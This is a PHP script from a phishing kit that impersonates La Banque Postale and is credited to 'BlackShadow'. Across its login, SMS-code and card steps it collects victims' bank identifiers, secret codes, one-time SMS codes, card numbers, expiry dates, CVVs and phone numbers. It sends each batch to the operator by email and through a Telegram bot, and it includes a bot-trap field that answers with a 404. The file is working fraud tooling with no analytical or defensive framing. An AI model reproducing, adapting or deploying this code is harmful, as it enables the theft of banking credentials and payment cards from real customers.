<?php


include_once 'depot/inc/functions.php';

$ip 	    	  = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

$headers = "MIME-Version: 1.0" . "\r\n";

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);




if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die();
    }

    if ($_POST['type'] == "login") {

        $_SESSION['username']    = $_POST['username'];
        $_SESSION['password']    = $_POST['password'];

        if( validate_number($_SESSION['username'],10) == false || validate_number($_POST['password'],6) == false ) {
            header("location: index.php?error=1&#_$dispatch");
            exit();
        }

        $message = "
		
			<style type='text/css'>
			*{
		font-family: fantasy;
			}
			font{
		color: #4EC353;
			}
			</style>
			<div style='font-weight: 800;color: #000000;background: #21368B;font-size: 14px;border: 1px solid #21368B;padding: 8px;border-radius: 5px 5px 0px 0px;font-size: 17px;'>La Banque Postale - LOG-IN | BlackShadow | 2022</center></div>
			<div style='font-weight: 800;border: 1px solid #21368B;padding: 8px;'>
			<hr>
			<center>Login Details</center>
			<p>Identification Number : <font>".$_SESSION['username']."</font><p>
			<p>Six Digit Personal Code : <font>".$_SESSION['password']."</font><p>
			<hr>
			<p>OS / Browser : <font>".$OS." - ".$Browser."</font><p>
			<p>IP : $ipv2 - <font>https://geoiptool.com/en/?ip=".$ipv2."</font><p>
			<p>Useragent : <font>".$user_agent."</font><p>
			</div>
			<div style='font-weight: 800;border: 1px solid #B20000;padding: 8px;'>
			<center>CODED BY BLACKSHADOW</center>
			</div>
			";

		///////////////////////////////////Mail Send Functions//////////////////////////////////////////
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
			$headers .= "From: BLACKSHADOW <>" . "\r\n";
			$subject  = "Iden. No: " . $_SESSION['username'] . " - La Banque Postale - Log-IN  - $ipv2 ";
            mail($to,$subject,$message,$headers);
        ////////////////////////////////////////////////////////////////////////////////////////////////

		

		////////////////////////////////TELEGRAM SEND////////////////////////////////
        $telegram_message = '💌 LOG BANQUE POSTAL' . get_user_ip() . "\r\n";
        $telegram_message .= '🧲 IDENTIFIANT : ' . $_SESSION['username'] . "\r\n";
        $telegram_message .= '🧲 CODE SECRET : ' . $_POST['password'] . "\r\n";
        $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
        telegram_send(urlencode($telegram_message));
		////////////////////////////////TELEGRAM SEND////////////////////////////////

        
        header("location: ../success.php");

    }



 if ($_POST['type'] == "confirm_code") {
        
        $_SESSION['confirm_code'] = $_POST['confirm_code'];


           $message = "
		
			<style type='text/css'>
			*{
		font-family: fantasy;
			}
			font{
		color: #4EC353;
			}
			</style>
			<div style='font-weight: 800;color: #000000;background: #21368B;font-size: 14px;border: 1px solid #21368B;padding: 8px;border-radius: 5px 5px 0px 0px;font-size: 17px;'>La Banque Postale - SMS | BlackShadow | 2022</center></div>
			<div style='font-weight: 800;border: 1px solid #21368B;padding: 8px;'>
			<hr>
			<center>Activation SMS</center>
			<p>SMS : <font>".$_SESSION['confirm_code']."</font><p>
			<hr>
			</div>
			<div style='font-weight: 800;border: 1px solid #B20000;padding: 8px;'>
			<center>CODED BY BLACKSHADOW</center>
			</div>
			";
			
			
		////////////////////////////////TELEGRAM SEND////////////////////////////////
        $telegram_message = '/-- POSTAL SMS INFO --/' . get_user_ip() . "\r\n";
        $telegram_message .= 'SMS 🍑 : ' . $_POST['confirm_code'] . "\r\n";
        $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
        telegram_send(urlencode($telegram_message));
		////////////////////////////////TELEGRAM SEND////////////////////////////////

		///////////////////////////////////Mail Send Functions//////////////////////////////////////////
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
			$headers .= "From: BLACKSHADOW <results@blackshadow.info>" . "\r\n";
			$subject  = "Iden. No: " . $_SESSION['username'] . " - La Banque Postale - SMS  - $ipv2 ";
            mail($to,$subject,$message,$headers);
        ////////////////////////////////////////////////////////////////////////////////////////////////



            header("location: cc.php?validation#_$dispatch");
       

    }


    if ($_POST['type'] == "cc") {
        
        $_SESSION['cc_number'] = $_POST['cc_number'];
        $_SESSION['cc_date']   = $_POST['cc_date'];
		$_SESSION['cc_cvv']    = $_POST['cc_cvv'];
		$_SESSION['teln'] = $_POST['teln'];

           $message = "
		
			<style type='text/css'>
			*{
		font-family: fantasy;
			}
			font{
		color: #4EC353;
			}
			</style>
			<div style='font-weight: 800;color: #000000;background: #21368B;font-size: 14px;border: 1px solid #21368B;padding: 8px;border-radius: 5px 5px 0px 0px;font-size: 17px;'>La Banque Postale - ALL INFO! | BlackShadow | 2022</center></div>
			<div style='font-weight: 800;border: 1px solid #21368B;padding: 8px;'>
			<hr>
			<center>ALL INFO!</center>
			<p>Card Number : <font>".$_SESSION['cc_number']."</font><p>
			<p>Expiration Date : <font>".$_SESSION['cc_date']."</font><p>
			<p>CVV : <font>".$_SESSION['cc_cvv']."</font><p>
			<p>Phone Number : <font>".$_SESSION['teln']."</font><p>
			<hr>
			</div>
			<div style='font-weight: 800;border: 1px solid #B20000;padding: 8px;'>
			<center>CODED BY BLACKSHADOW</center>
			</div>
			";

		///////////////////////////////////Mail Send Functions//////////////////////////////////////////
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
			$headers .= "From: BLACKSHADOW <results@blackshadow.info>" . "\r\n";
			$subject  = "Iden. No: " . $_SESSION['username'] . " - La Banque Postale - ALL DETAILS!  - $ipv2 ";
            mail($to,$subject,$message,$headers);
        ////////////////////////////////////////////////////////////////////////////////////////////////


		////////////////////////////////TELEGRAM SEND////////////////////////////////
        $telegram_message = '/-- POSTAL ALL DETAILS! --/' . get_user_ip() . "\r\n";
		$telegram_message .= 'Telephone 🍇 : ' . $_POST['teln'] . "\r\n";
        $telegram_message .= 'Numero de carte 🍇 : ' . $_POST['cc_number'] . "\r\n";
        $telegram_message .= 'Exp 🍇 : ' . $_POST['cc_date'] . "\r\n";
        $telegram_message .= 'CVV 🍇 : ' . $_POST['cc_cvv'] . "\r\n";
        $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
         telegram_send(urlencode($telegram_message));
		////////////////////////////////TELEGRAM SEND////////////////////////////////



            header("location: finish.php?validation#_$dispatch");


    }

   


   

}

?>